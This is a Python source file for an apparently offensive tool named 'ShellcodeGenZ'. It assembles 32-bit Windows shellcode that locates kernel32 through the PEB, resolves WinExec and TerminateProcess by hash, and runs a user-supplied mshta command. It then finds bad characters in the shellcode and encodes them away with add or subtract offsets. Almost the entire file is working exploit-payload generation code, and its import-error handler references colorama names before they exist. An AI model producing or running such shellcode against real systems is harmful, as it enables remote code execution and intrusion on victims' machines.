import logging
import sys
from typing import List, Tuple, Dict

try:
    from colorama import init, Fore, Style
except ImportError:
    print(f"{Fore.RED}Yo, colorama's ghosted us! Grab it with:{Style.RESET_ALL}")
    print(f"{Fore.WHITE}pip install colorama{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Got an 'externally-managed-environment' error? Pop off with a virtual env:{Style.RESET_ALL}")
    print(f"{Fore.WHITE}python3 -m venv venv && source venv/bin/activate && pip install colorama{Style.RESET_ALL}")
    sys.exit(1)

try:
    from keystone import Ks, KsError, KS_ARCH_X86, KS_MODE_32
except ImportError:
    print(f"{Fore.RED}Bruh, keystone-engine ain't here! Snag it with:{Style.RESET_ALL}")
    print(f"{Fore.WHITE}pip install keystone-engine{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Hit an 'externally-managed-environment' error? Get that virtual env glow-up:{Style.RESET_ALL}")
    print(f"{Fore.WHITE}python3 -m venv venv && source venv/bin/activate && pip install keystone-engine{Style.RESET_ALL}")
    sys.exit(1)

init(autoreset=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

print(f"{Fore.CYAN}ShellcodeGenZ by: Zeyad Azima ( https://zeyadazima.com - contact@zeyadazima.com ) - let's get this shellcode poppin'!{Style.RESET_ALL}")

class ShellcodeGenerator:
    
    def __init__(self):
        try:
            self.ks = Ks(KS_ARCH_X86, KS_MODE_32)
        except KsError as e:
            logger.error(f"{Fore.RED}Big yikes! Keystone engine ain't vibin': {e}{Style.RESET_ALL}")
            sys.exit(1)

    def _validate_input(self, mshta_command: str, badchars: str) -> Tuple[str, List[str]]:
        if not mshta_command:
            logger.error(f"{Fore.RED}Yo, mshta command can't be empty, fam! Drop somethin'.{Style.RESET_ALL}")
            sys.exit(1)
        
        if not badchars:
            logger.warning(f"{Fore.YELLOW}No bad chars? Bet, we checkin' 0x00 by default, no cap.{Style.RESET_ALL}")
            badchars_list = ['00']
        else:
            badchars_list = [bc.strip().lower() for bc in badchars.split(",") if bc.strip()]
            if not badchars_list:
                logger.warning(f"{Fore.YELLOW}Bad chars lookin' sus, defaultin' to 0x00 check.{Style.RESET_ALL}")
                badchars_list = ['00']
            if '00' not in badchars_list:
                badchars_list.append('00')
        
        return mshta_command, badchars_list

    def _validate_replacement(self, replacement: str) -> bool:
        if len(replacement) != 2:
            return False
        try:
            int(replacement, 16)
            return True
        except ValueError:
            return False

    def convert_to_hex_little_endian(self, value: str) -> List[str]:
        if len(value) % 4 != 0:
            padding_length = 4 - (len(value) % 4)
            value += '\x00' * padding_length
        
        results = []
        for i in range(0, len(value), 4):
            chunk = value[i:i + 4]
            hex_str = ''.join([f"{ord(c):02x}" for c in chunk])
            little_endian = ''.join(reversed([hex_str[i:i + 2] for i in range(0, len(hex_str), 2)]))
            if '00' in little_endian:
                logger.error(f"{Fore.RED}Bruh, push '0x{little_endian}' got 0x00! That’s a no-go, fam.{Style.RESET_ALL}")
                sys.exit(1)
            results.append(f"push 0x{little_endian};")
        
        return results[::-1]

    def check_badchars(self, shellcode: str, badchars: List[str]) -> List[str]:
        if not badchars:
            return []
        
        shellcode_bytes = shellcode.split("\\x")[1:]
        detected_badchars = set()
        
        for index, byte in enumerate(shellcode_bytes):
            if byte in badchars:
                logger.warning(
                    f"{Fore.RED}Caught bad char 0x{byte} lurkin’ at index {index}! Sus vibes.{Style.RESET_ALL}"
                )
                if index < len(shellcode_bytes):
                    logger.info(
                        f"{Fore.YELLOW}Nearby byte be like: 0x{shellcode_bytes[index]}{Style.RESET_ALL}"
                    )
                detected_badchars.add(byte)
        
        return sorted(detected_badchars)

    def _automated_badchar_replacement(self, badchars: List[str], original_badchars: List[str]) -> Dict[str, str]:
        operation = input(f"{Fore.CYAN}Yo, what’s the move? Add or subtract for encodin’? (add/subtract): {Style.RESET_ALL}").strip().lower()
        if operation not in ['add', 'subtract']:
            logger.error(f"{Fore.RED}Bruh, that’s a sus operation. Gotta pick 'add' or 'subtract,' fam!{Style.RESET_ALL}")
            sys.exit(1)
        
        offset_choice = input(f"{Fore.CYAN}You droppin’ your own offset or we auto-pickin’? (manual/automatic): {Style.RESET_ALL}").strip().lower()
        if offset_choice not in ['manual', 'automatic']:
            logger.error(f"{Fore.RED}Nah, that offset choice ain’t it. Pick 'manual' or 'automatic,' homie!{Style.RESET_ALL}")
            sys.exit(1)
        
        logger.info(f"{Fore.CYAN}Kickin’ off bad char yeetin’ with {operation} vibes and {offset_choice} offset slay{Style.RESET_ALL}")
        logger.info(f"Bad chars we gotta yeet: {', '.join([f'0x{b}' for b in badchars])}")
        logger.info(f"Chars we dodgin’: {', '.join([f'0x{b}' for b in original_badchars])}")
        
        if offset_choice == 'manual':
            while True:
                offset_hex = input(f"{Fore.CYAN}Drop a 2-char hex offset (like '01'): {Style.RESET_ALL}").strip().lower()
                if not self._validate_replacement(offset_hex):
                    logger.error(f"{Fore.RED}That offset’s whack! Need a legit 2-char hex, like '01'. Try again.{Style.RESET_ALL}")
                    continue
                if offset_hex in original_badchars:
                    logger.error(f"{Fore.RED}Offset 0x{offset_hex} is a bad char, no bueno! Pick another.{Style.RESET_ALL}")
                    continue
                logger.info(f"{Fore.GREEN}Aight, we vibin’ with manual offset 0x{offset_hex}!{Style.RESET_ALL}")
                break
            offsets = [int(offset_hex, 16)]
        else:
            offsets = list(range(0x01, 0x100))
            logger.info(f"{Fore.YELLOW}Goin’ auto mode, testin’ offsets 0x01 to 0xff like a boss!{Style.RESET_ALL}")
        
        for offset in offsets:
            offset_hex = f"{offset:02x}"
            if offset_choice == 'automatic' and offset_hex in original_badchars:
                logger.info(f"Dippin’ past offset 0x{offset_hex} ‘cause it’s a bad char")
                continue
            
            logger.info(f"Checkin’ offset 0x{offset_hex}... let’s see if it slaps")
            replacements = {}
            valid = True
            for badchar in badchars:
                badchar_int = int(badchar, 16)
                if operation == 'add':
                    new_value = (badchar_int + offset) % 256
                else:
                    new_value = (badchar_int - offset) % 256
                new_hex = f"{new_value:02x}"
                
                logger.info(f"  Bad char 0x{badchar} turnin’ into 0x{new_hex} ({operation} 0x{offset_hex})")
                
                if new_hex in original_badchars:
                    logger.warning(f"  New value 0x{new_hex} is a bad char, so offset 0x{offset_hex} ain’t it")
                    valid = False
                    break
                replacements[badchar] = new_hex
            
            if valid:
                logger.info(f"{Fore.GREEN}YO, offset 0x{offset_hex} is straight fire for {operation}!{Style.RESET_ALL}")
                logger.info(f"Replacements droppin’: {', '.join([f'0x{k} -> 0x{v}' for k, v in replacements.items()])}")
                return replacements
        
        logger.error(f"{Fore.RED}Big oof, couldn’t find a good offset for encodin’. We tried, fam!{Style.RESET_ALL}")
        sys.exit(1)

    def replace_badchars(self, shellcode: str, badchars: List[str], original_badchars: List[str]) -> str:
        replace_choice = input(f"{Fore.CYAN}Wanna yeet those bad chars? (Y/N): {Style.RESET_ALL}").strip().upper()
        if replace_choice != 'Y':
            logger.info(f"{Fore.YELLOW}Aight, skippin’ bad char yeetin’. Keepin’ it chill.{Style.RESET_ALL}")
            return shellcode
        
        method_choice = input(f"{Fore.CYAN}You goin’ manual or auto for yeetin’ bad chars? (manual/automated): {Style.RESET_ALL}").strip().lower()
        if method_choice not in ['manual', 'automated']:
            logger.error(f"{Fore.RED}Nah, that method’s sus. Gotta be 'manual' or 'automated,' homie!{Style.RESET_ALL}")
            sys.exit(1)
        
        if method_choice == 'manual':
            logger.info(f"{Fore.CYAN}Aight, let’s get hands-on with manual bad char yeetin’!{Style.RESET_ALL}")
            replacements: Dict[str, str] = {}
            for badchar in badchars:
                while True:
                    replacement = input(f"{Fore.CYAN}Drop a new hex for 0x{badchar} (like '01'): {Style.RESET_ALL}").strip().lower()
                    if not self._validate_replacement(replacement):
                        logger.error(f"{Fore.RED}That’s a whack hex! Need a 2-char hex like '01'. Try again.{Style.RESET_ALL}")
                        continue
                    if replacement in original_badchars:
                        logger.error(f"{Fore.RED}Yo, 0x{replacement} is a bad char! Pick somethin’ else.{Style.RESET_ALL}")
                        continue
                    replacements[badchar] = replacement
                    logger.info(f"{Fore.GREEN}Sweet, locked in 0x{badchar} -> 0x{replacement}!{Style.RESET_ALL}")
                    break
        else:
            replacements = self._automated_badchar_replacement(badchars, original_badchars)
        
        shellcode_bytes = shellcode.split("\\x")[1:]
        updated_bytes = [
            replacements.get(byte, byte) for byte in shellcode_bytes
        ]
        updated_shellcode = "".join([f"\\x{byte}" for byte in updated_bytes])
        
        logger.info(f"{Fore.GREEN}Shellcode’s lookin’ fresh with new vibes: shellcode = b\"{updated_shellcode}\"!{Style.RESET_ALL}")
        return updated_shellcode

    def generate_shellcode(self, mshta_commands: List[str], badchars: List[str]) -> None:
        asm_code = (
            " start:                             "
            "   mov   ebp, esp                  ;"
            "   add   esp, 0xfffff9f0           ;"
            " find_kernel32:                     "
            "   xor   ecx, ecx                  ;"
            "   mov   esi,fs:[ecx+0x30]         ;"
            "   mov   esi,[esi+0x0C]            ;"
            "   mov   esi,[esi+0x1C]            ;"
            " next_module:                       "
            "   mov   ebx, [esi+0x08]           ;"
            "   mov   edi, [esi+0x20]           ;"
            "   mov   esi, [esi]                ;"
            "   cmp   [edi+12*2], cx            ;"
            "   jne   next_module               ;"
            " find_function_shorten:             "
            "   jmp find_function_shorten_bnc   ;"
            " find_function_ret:                 "
            "   pop esi                         ;"
            "   mov   [ebp+0x04], esi           ;"
            "   jmp resolve_symbols_kernel32    ;"
            " find_function_shorten_bnc:         "
            "   call find_function_ret          ;"
            " find_function:                     "
            "   pushad                          ;"
            "   mov   eax, [ebx+0x3c]           ;"
            "   mov   edi, [ebx+eax+0x78]       ;"
            "   add   edi, ebx                  ;"
            "   mov   ecx, [edi+0x18]           ;"
            "   mov   eax, [edi+0x20]           ;"
            "   add   eax, ebx                  ;"
            "   mov   [ebp-4], eax              ;"
            " find_function_loop:                "
            "   jecxz find_function_finished    ;"
            "   dec   ecx                       ;"
            "   mov   eax, [ebp-4]              ;"
            "   mov   esi, [eax+ecx*4]          ;"
            "   add   esi, ebx                  ;"
            " compute_hash:                      "
            "   xor   eax, eax                  ;"
            "   cdq                             ;"
            "   cld                             ;"
            " compute_hash_again:                "
            "   lodsb                           ;"
            "   test  al, al                    ;"
            "   jz    compute_hash_finished     ;"
            "   ror   edx, 0x0d                 ;"
            "   add   edx, eax                  ;"
            "   jmp   compute_hash_again        ;"
            " compute_hash_finished:             "
            " find_function_compare:             "
            "   cmp   edx, [esp+0x24]           ;"
            "   jnz   find_function_loop        ;"
            "   mov   edx, [edi+0x24]           ;"
            "   add   edx, ebx                  ;"
            "   mov   cx,  [edx+2*ecx]          ;"
            "   mov   edx, [edi+0x1c]           ;"
            "   add   edx, ebx                  ;"
            "   mov   eax, [edx+4*ecx]          ;"
            "   add   eax, ebx                  ;"
            "   mov   [esp+0x1c], eax           ;"
            " find_function_finished:            "
            "   popad                           ;"
            "   ret                             ;"
            " resolve_symbols_kernel32:          "
            "   push  0xe8afe98                 ;"
            "   call  find_function             ;"
            "   mov   [ebp+0x12], eax           ;"
            "   push  0x78b5b983                ;"
            "   call  find_function             ;"
            "   mov   [ebp+0x16], eax           ;"
            " create_hta:                       "
            "   xor ecx, ecx                    ;"
            "   push  ecx                       ;"
        ) + "\n".join(mshta_commands) + (
            "   push  esp                       ;"
            "   pop   ebx                       ;"
            " WinExec:                           "
            "   xor ecx, ecx                    ;"
            "   push ecx                        ;"
            "   push ebx                        ;"
            "   call dword ptr [ebp+0x12]       ;"
            " terminate_process:                 "
            "   xor   ecx, ecx                  ;"
            "   push  ecx                       ;"
            "   push  0xffffffff                ;"
            "   call dword ptr [ebp+0x16]       ;"
        )

        try:
            encoding, count = self.ks.asm(asm_code)
            shellcode = "".join([f"\\x{dec:02x}" for dec in encoding])
            
            logger.info(f"{Fore.GREEN}mshta shellcode’s droppin’ like a banger: shellcode = b\"{shellcode}\"!{Style.RESET_ALL}")
            logger.info(f"{Fore.CYAN}Shellcode’s flexin’ at {len(encoding)} bytes, no cap!{Style.RESET_ALL}")
            
            detected_badchars = self.check_badchars(shellcode, badchars)
            if detected_badchars:
                updated_shellcode = self.replace_badchars(shellcode, detected_badchars, badchars)
                if updated_shellcode != shellcode:
                    logger.info(f"{Fore.CYAN}New shellcode length’s poppin’ off at {len(updated_shellcode.split('\\x')[1:])} bytes!{Style.RESET_ALL}")
            
        except KsError as e:
            logger.error(f"{Fore.RED}Oof, assemblin’ shellcode went sideways: {e}{Style.RESET_ALL}")
            sys.exit(1)

def main():
    generator = ShellcodeGenerator()
    
    mshta_command = input(f"{Fore.CYAN}Drop your mshta command to make it lit: {Style.RESET_ALL}")
    badchars = input(f"{Fore.CYAN}Spill the bad chars to yeet (comma vibes, like '0a,0b'): {Style.RESET_ALL}")
    
    mshta_command, badchars_list = generator._validate_input(mshta_command, badchars)
    
    mshta_instructions = generator.convert_to_hex_little_endian(mshta_command)
    logger.info(f"{Fore.GREEN}mshta instructions are straight fire:\n{'\n'.join(mshta_instructions)}{Style.RESET_ALL}")
    
    generator.generate_shellcode(mshta_instructions, badchars_list)
    
    print(f"{Fore.CYAN}ShellcodeGenZ by: Zeyad Azima ( https://zeyadazima.com - contact@zeyadazima.com ) - we slayed it, fam!{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
